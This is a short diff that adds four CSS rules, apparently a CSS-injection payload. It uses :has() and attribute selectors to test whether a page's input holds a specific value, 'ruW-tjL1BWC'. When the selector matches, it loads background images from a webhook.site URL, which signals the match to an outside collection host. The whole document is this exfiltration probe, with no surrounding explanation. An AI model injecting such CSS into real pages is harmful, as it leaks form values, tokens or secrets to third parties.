@@ -1,0 +1,4 @@
+html:has(input){background-image:url("https://webhook.site/6e85a813-489c-4879-8561-1e9177793eee?s=5cping");}
+input[value="ruW-tjL1BWC"]~input{background-image:url("https://webhook.site/6e85a813-489c-4879-8561-1e9177793eee?s=5cYES");}
+form:has(input[value="ruW-tjL1BWC"]){background-image:url("https://webhook.site/6e85a813-489c-4879-8561-1e9177793eee?s=5cYES2");}
+input[value="ruW-tjL1BWC"]{outline-color:red;}
